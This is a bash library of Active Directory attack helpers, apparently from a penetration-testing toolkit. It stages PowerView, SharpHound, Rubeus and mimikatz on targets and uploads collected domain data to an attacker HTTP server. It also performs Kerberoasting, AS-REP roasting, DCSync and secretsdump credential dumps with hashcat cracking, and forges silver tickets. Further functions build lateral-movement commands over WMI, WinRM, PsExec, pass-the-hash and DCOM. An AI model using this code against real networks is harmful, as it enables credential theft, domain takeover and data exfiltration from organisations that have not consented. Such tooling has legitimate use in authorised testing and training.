#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/password_cracking.sh"

get_powerview() {
    if [[ -f "powerview.ps1" ]]; then
        echo "Powerview script already exists, skipping download."
        return 0
    fi
    cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 PowerView.ps1
    generate_iwr PowerView.ps1
    echo '. .\PowerView.ps1;'
}

get_ldap_search() {
    if [[ ! -f "ldap_search.ps1" ]]; then
        cp "$SCRIPTDIR/../ps1/ldap_search.ps1" ldap_search.ps1   
    fi
    generate_iwr ldap_search.ps1
    echo '. .\ldap_search.ps1;'
}

get_psloggedon() {

    if [[ ! -f "/tmp/PsTools.zip" ]]; then
        wget "https://download.sysinternals.com/files/PSTools.zip" -O /tmp/PSTools.zip >> $trail_log
    fi
    if [[ ! -f "/tmp/PsLoggedon.exe" ]]; then
        pushd /tmp > /dev/null
        unzip -u PSTools.zip >> $trail_log
        popd > /dev/null
    fi
    if [[ ! -f "PsLoggedon.exe" ]]; then
        cp /tmp/PsLoggedon.exe .        
    fi
    generate_iwr PsLoggedon.exe
    echo '.\PsLoggedon.exe;'
}

get_sharphound() {
    sharphound_version=v2.6.7
    sharphound_url="https://github.com/SpecterOps/SharpHound/releases/expanded_assets/$sharphound_version"
    sharphound_download_url=$(curl -s $sharphound_url | grep -oP 'href="\K[^"]+' | grep "zip$" | grep "${sharphound_version}_windows")
    echo "Downloading SharpHound from: $sharphound_download_url" >> $trail_log
    if [[ ! -f "/tmp/sharphound_$sharphound_version.zip" ]]; then    
        wget "https://github.com$sharphound_download_url" -O /tmp/sharphound_$sharphound_version.zip >> $trail_log
    fi
    pushd /tmp > /dev/null
    unzip -u sharphound_$sharphound_version.zip >> $trail_log
    popd > /dev/null
    if [[ ! -f "SharpHound.ps1" ]]; then
        cp /tmp/SharpHound.ps1 .
    else
        echo "SharpHound executable not found after extraction." >> $trail_log
    fi
    generate_iwr SharpHound.ps1
    echo '. .\SharpHound.ps1;'
    echo 'Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit";'
    echo 'Get-ChildItem -Filter "audit*.zip" | ForEach-Object { Invoke-WebRequest -Uri "http://'$http_ip':'$http_port'/$_" -InFile $_.FullName -Method Put };'
}

start_neo4j() {
    if pgrep -f "neo4j" > /dev/null; then
        echo "Neo4j is already running."
        return 0
    fi
    sudo neo4j start & >> $trail_log
}

stop_neo4j() {
    if ! pgrep -f "neo4j" > /dev/null; then
        echo "Neo4j is not running."
        return 0
    fi
    neo4j_pid=$(pgrep -f "neo4j")
    sudo kill $neo4j_pid >> $trail_log
}

start_bloodhound() { 
    pushd "$SCRIPTDIR/../docker/bloodhound"
    if [[ ! -f "docker-compose.yml" ]]; then
        echo "docker-compose.yml not found in the current directory."
        return 1
    fi
    docker compose up -d >> $trail_log
    popd
}

stop_bloodhound() {
    pushd "$SCRIPTDIR/../docker/bloodhound"
    if ! docker compose ps | grep -q "Up"; then
        echo "BloodHound is not running."
        return 0
    fi
    docker compose down >> $trail_log
    popd
}   

bloodhound_error() {
    local return_data=$1
    if [[ -z "$return_data" ]]; then
        echo "No data returned from BloodHound API." | tee -a $trail_log
        return 1
    fi
    if [[ $(echo "$return_data" | jq -r '.errors[0].message') != "null" ]]; then
        echo "BloodHound API error: $(echo "$return_data" | jq -r '.errors[0].message')" | tee -a $trail_log
        return 1
    fi
}

bloodhound_login() {
    if [[ -z "$bloodhound_password" ]]; then
        bloodhound_password=$(cat $SCRIPTDIR/../docker/bloodhound/bloodhound.config.json | jq -r '.default_password')
        bloodhound_password+='!'
    fi
    if [[ -z "$bloodhound_ip" ]]; then
        bloodhound_ip=$(docker ps --filter ancestor=specterops/bloodhound --format json | jq -r ".Ports" | grep -oP '^\K[^:]+')
    fi
    if [[ -z "$bloodhound_port" ]]; then
        bloodhound_port=$(docker ps --filter ancestor=specterops/bloodhound --format json | jq -r ".Ports" | grep -oP ':\K[^-]+')
    fi
    local login_return=$(curl -s -d '{"login_method": "secret", "username":"admin", "secret":"'$bloodhound_password'"}' \
        -H "Content-Type: application/json" \
        http://$bloodhound_ip:$bloodhound_port/api/v2/login)
    if [[ ! -z "$login_return" ]]; then
        bloodhound_error "$login_return"
        if [[ $? -ne 0 ]]; then
            return 1
        fi
        bloodhound_authorization="Authorization: Bearer "$(echo "$login_return" | jq -r '.data.session_token')
    else
        echo "BloodHound login failed." >> $trail_log
        return 1
    fi

}


bloodhound_start_upload() {
    if [[ -z "$bloodhound_authorization" ]]; then
        echo "BloodHound authorization token is not set. Please login first." | tee -a $trail_log
        return 1
    fi
    local start_upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/start \
        -H "Content-Type: application/json" \
        -H "$bloodhound_authorization" \
        -d '')
    if [[ ! -z "$start_upload_return" ]]; then
        bloodhound_error "$start_upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to start BloodHound upload." | tee -a $trail_log
            return 1
        fi
        bloodhound_upload_job_id=$(echo "$start_upload_return" | jq -r '.data.id')
    fi
}

bloodhound_upload_file () {
    if [[ -z "$bloodhound_upload_job_id" ]]; then
        echo "BloodHound upload job ID is not set. Please start upload first." | tee -a $trail_log
        return 1
    fi
    if [[ -z "$1" ]]; then
        echo "File path is required for upload." | tee -a $trail_log
        return 1
    fi
    local file_path="$1"
    if [[ ! -f "$file_path" ]]; then
        echo "File $file_path does not exist."
        return 1
    fi
    local upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/$bloodhound_upload_job_id \
        -H "$bloodhound_authorization" \
        -H "Content-Type: application/zip" \
        --data-binary @"$file_path")
    if [[ ! -z "$upload_return" ]]; then
        bloodhound_error "$upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to upload files" 
            return 1
        fi
        echo "File uploaded successfully: $upload_return"
    else
        echo "No response, assuming upload was successful." 
    fi

}

bloodhound_end_upload() {
    if [[ -z "$bloodhound_upload_job_id" ]]; then
        echo "BloodHound upload job ID is not set. Please start upload first." | tee -a $trail_log
        return 1
    fi
    local end_upload_return=$(curl -s -X POST http://$bloodhound_ip:$bloodhound_port/api/v2/file-upload/$bloodhound_upload_job_id/end \
        -H "Content-Type: application/json" \
        -H "$bloodhound_authorization" \
        -d '')
    if [[ ! -z "$end_upload_return" ]]; then
        bloodhound_error "$end_upload_return"
        if [[ $? -ne 0 ]]; then
            echo "Failed to end BloodHound upload." 
            return 1
        fi
        echo "BloodHound upload ended successfully."
    else
        echo "No response, assuming end upload ended successfully."       
    fi
}

upload_bloodhound_data() {
    local file_path="$1"
    if [[ -z "$file_path" ]]; then
        echo "File path is required for BloodHound upload."
        return 1
    fi
    if [[ ! -f "$file_path" ]]; then
        echo "File $file_path does not exist."
        return 1
    fi
    if [[ -f "$file_path.done" ]]; then
        echo "BloodHound upload for $file_path is already done."
        return 0
    fi
    bloodhound_login
    bloodhound_start_upload
    bloodhound_upload_file "$1"
    bloodhound_end_upload
    if [[ $? -eq 0 ]]; then
        echo "BloodHound data uploaded successfully."
        touch "$file_path.done"
    else
        echo "Failed to upload BloodHound data."
        return 1
    fi
}

get_spray_passwords() {
    if [[ ! -f "Spray-Passwords.ps1" ]]; then
        cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
    fi
    generate_iwr Spray-Passwords.ps1

}

get_kerbrute() {
    local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
    if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
        wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
    fi
    generate_iwr kerbrute_windows_amd64.exe
}

get_crackmapexec_windows() {
    local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
    if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
        wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
    fi
    if [[ ! -f "cme.exe" ]]; then
        unzip cme-windows-latest-3.10.1.zip >> $trail_log
        mv cme cme.exe
    fi
    generate_iwr cme.exe
}

get_computers() {
    echo '. .\PowerView.ps1;'
    echo 'Get-DomainComputer | select -ExpandProperty name > computers.txt;'
    upload_file 'computers.txt'
}

get_rubeus() {
    if [[ ! -f "Rubeus.exe" ]]; then
        cp /usr/share/windows-resources/rubeus/Rubeus.exe .
    fi
    generate_iwr Rubeus.exe
}

perform_kerberoast_rubeus() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    get_rubeus
    echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
    upload_file $hash_file
}

perform_asrep_roasting() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.asreproast"
    fi
    perform_impacket "impacket-GetNPUsers" "-request"
}

perform_impacket_kerberoast() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    perform_impacket "impacket-GetUserSPNs" "-request"
}

perform_impacket() {
    local impacket_command="$1"
    if [[ -z "$impacket_command" ]]; then
        echo "Impacket command must be specified."
        return 1
    fi
    local impacket_command_options=""
    if [[ ! -z "$2" ]]; then
        impacket_command_options="$2"
    fi
    local proxychain_command=""
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ -z "$username" ]] ; then
        echo "Username must be set before running Kerberoast."
        return 1
    fi
    if [[ -z "$domain" ]] ; then
        echo "No domain was set. Make sure you are sure about this"
    fi
    if [[ -z "$target_ip" ]]; then
        echo "target_ip is not set" 
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running $impacket_command with proxychains"
    else
        proxychain_command=""
    fi
    local impacket_dc_host=""
    if [[ ! -z "$dc_host" ]]; then
        impacket_dc_host="-dc-host $dc_host"
    fi
    local impacket_dc_ip=""
    if [[ ! -z "$dc_ip" ]]; then
        impacket_dc_ip="-dc-ip $dc_ip"
    fi
    if [[ -z "$impacket_dc_host" ]] && [[ -z "$impacket_dc_ip" ]]; then
        echo "Either impacket_dc_host or impacket_dc_ip must be set for Kerberoast."
        return 1
    fi
    if [[ -f "$hash_file" ]]; then
        echo "$hash_file already exists, skipping impacket"
        return 0
    fi
    local target=$username:$password
    if [[ ! -z "$domain" ]]; then
        target="$domain/$target"
    fi
    if [[ ! -z "$target_ip" ]]; then
        target="$target@$target_ip"        
    fi
    echo "target=$target"
    ${proxychain_command}$impacket_command $impacket_command_options $impacket_dc_host $impacket_dc_ip -outputfile $hash_file -no-pass -k $target

}


hashcat_kerberoast() {    
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    hash_mode=13100  # Kerberoast hash mode
    hashcat_generic 
}

hashcat_asrep_kerberoast() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.asreproast"
    fi
    hash_mode=18200  # AS-REP Kerberos hash mode
    hashcat_generic
}

get_silverticket_command() {
    if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
        return 1
    fi
    if [[ -z "$target_service" ]]; then
        target_service="http"
    fi
    echo '$sid = whoami /user | findstr '$username' | ForEach-Object {$parts = $_.Split('"' '"'); $parts[1]} | ForEach-Object {$last_index=$_.LastIndexOf('"'-'"'); $_.Substring(0,$last_index)}'
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_log.txt;'
    echo '$mimikatz_log = Get-Content mimikatz_log.txt -Raw;'
    echo '$matches = $mimikatz_log | Select-String -Pattern "(?s)iis_service.*?SHA1"'
    echo '$ntlm_hash = $matches.Matches.Value | findstr NTLM | ForEach-Object {$last_index=$_.LastIndexOf('"':'"'); $_.SubString($last_index+2)}'
    echo '$username = "'$username'"'
    echo '$domain = "'$domain'"'
    echo '$target = "'$target_hostname'"'
    echo '$target_service = "'$target_service'"'
    echo '.\mimikatz.exe "kerberos::golden /sid:$sid /domain:$domain /ptt /target:$target /service:$target_service /rc4:$ntlm_hash /user:$username" exit'

}

get_dcsync_command() {
    if [[ -z "$target_username" ]]; then
        echo "Target username is required for DCSync command."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.dcsync"
    fi
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_dcsync.log"
    fi
    get_mimikatz
    echo '.\mimikatz.exe "lsadump::dcsync /user:'$target_username'" exit > '$mimikatz_log';'
    upload_file "$mimikatz_log"
    if [[ -f $mimikatz_log ]]; then
        echo "DCSync command executed successfully, log saved to $mimikatz_log."
        sudo dos2unix $mimikatz_log
        ntlm_hash=$(grep -oP 'Hash NTLM: \K.*' $mimikatz_log | head -n 1)
        echo "NTLM hash extracted: $ntlm_hash"
        if [[ ! -z "$ntlm_hash" ]]; then
            echo $ntlm_hash > $hash_file
            hashcat -m 1000 $hash_file /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
        fi
    fi
}

perform_impacket_secretsdump () {

    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.secretsdump"
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running secretsdump."
        return 1
    fi
    perform_impacket "impacket-secretsdump" "-just-dc-user $target_username"

}

perform_wmic_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local wmic_command="wmic /node:$target_ip /user:$username /password:$password process call create \"$cmd\""
    echo "$wmic_command"
}

perform_wmic_powershell_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='$options = New-CimSessionOption -Protocol DCOM;'
    powershell_commands+='$session = New-Cimsession -ComputerName '$target_ip' -Credential $credential -SessionOption $Options;'
    powershell_commands+='$command = '"'$cmd';"
    powershell_commands+='Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};'
    echo "$powershell_commands"

}

perform_winrs_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WinRM cmd is required."
        return 1
    fi
    local winrs_command="winrs -r:$target_ip -u:$username -p:$password \"$cmd\""
    echo "$winrs_command"
}

perform_powershell_remoting_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
    powershell_commands+='Enter-PSSession 1'
    echo "$powershell_commands"
}

get_psexec() {
    local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
    if [[ ! -f  "PSTools.zip" ]]; then
        wget "$pstools_link" -O PSTools.zip >> $trail_log
    fi
    if [[ -z "$PsExec_exe" ]]; then
        PsExec_exe="PsExec.exe"
    fi
    if [[ ! -d "pstools" ]]; then
        unzip -u PSTools.zip -d pstools >> $trail_log
    fi
    generate_iwr "pstools/$PsExec_exe" "$PsExec_exe"
}

run_psexec() { 
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, password, and target hostname address must be set before running PsExec command."
        return 1
    fi
    echo '--- PSExec criteria ---'
    echo 'credentials must be part of local administrators group'
    echo 'ADMIN$ share must be enabled'
    echo 'File and Printer Sharing must be enabled'
    local psexec_username="$username"
    if [[ ! -z "$domain" ]]; then
        psexec_username="$domain\\$username"
    fi
    get_psexec
    local psexec_command=".\\$PsExec_exe -u $psexec_username -p $password -i \\\\$target_hostname cmd"
    echo "$psexec_command"

}

perform_impacket_wmiexec() {
    if [[ -z "$username" ]] || [[ -z "$ntlm_hash" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
        return 1
    fi
    impacket-wmiexec -hashes $ntlm_hash $username@$target_ip
}

perform_dcom() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP address must be set before running DCOM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "DCOM cmd is required."
        return 1
    fi
    local powershell_command='$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","'$target_ip'"));'
    powershell_command+='$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c '$cmd'", "7")'
    echo "$powershell_command"   
}